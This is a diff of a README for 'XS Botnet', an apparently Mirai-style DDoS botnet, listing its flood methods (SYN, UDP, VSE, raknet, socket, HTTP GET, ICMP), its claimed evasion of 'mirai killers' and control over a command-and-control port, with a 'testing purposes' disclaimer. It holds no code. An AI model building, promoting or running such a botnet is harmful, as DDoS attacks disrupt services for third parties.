@@ -1,15 +1,8 @@
-![Img](image.png?raw=true "Screenshot")
-
-# Changelog:
-- Read Changelog.md for changelog 
-- Small update at 14 may 2025 (bugfix)
-
-## XS Botnet
+![Img](image.webp?raw=true "Screenshot")
+# XS Botnet
 - made by: daylight911 (discord), FuckIsra3l(telegram)
-- Made in github codespaces(Make & C ext, Copilot).
-- There may be some bugs
-
-## Features:
+- Made in github codespaces with copilot, there may be some bugs
+# Features:
 - Clear scren
 - Stopall
 - exit
@@ -21,22 +14,19 @@
 - Logs
 - Arch list
 - Almost undetectable by mirai killers (tested)
-- Attack options
-
-## UDP Methods
-- VSE - UDP VSE Query flood
-- UDP - Plain/Raw UDP Flood 
-- raknet - UnConnected Ping + Magic flood
-## TCP Methods
-- SYN - TCP Syn flood, made for pps
-- Socket - Floods TCP Active connections, No data
-- HTTP - HTTP 1.1 GET Flood
-## Layer3 Methods
-- icmp - ICMP ECHO Flood
-
+# Methods:
+- Syn (Well Optimised & tested)
+- Vse (Valve source engine query flood)
+- UDP (Normal udp, No extra headers, just default)
+- Socket (Connect flood no data, Not tested)
+- http (HTTP 1.1 Get Attack)
 # Install tutorial?
 - Check tutorial.txt
 
 # Connection
 - Putty raw using your vps ip and cnc port
 
+### IMPORTANT NOTES:
+- THIS IS FOR TESTING PURPOSES, ITS NOT MY FAULT IF SOMEONE USES FOR DDOS
+- It may have simple methods but atleast i made something cool?
+- Todo: Fix stupid shit Disconnect terminal (They are immune to be disconnected again because of shit code)
